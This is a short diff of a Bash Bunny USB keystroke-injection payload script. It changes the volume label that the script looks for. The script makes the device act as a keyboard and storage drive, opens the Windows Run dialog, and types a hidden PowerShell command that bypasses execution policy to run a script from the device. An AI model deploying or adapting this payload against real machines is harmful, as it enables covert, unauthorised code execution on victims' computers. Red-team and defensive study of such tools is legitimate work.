@@ -18,6 +18,6 @@ LED ATTACK
 ATTACKMODE HID STORAGE
 Q GUI r
 Q DELAY 100
-Q STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass ".((gwmi win32_volume -f 'label=''BB''').Name+'payloads\\$SWITCH_POSITION\webserver.ps1')"
+Q STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\webserver.ps1')"
 Q ENTER
 LED FINISH
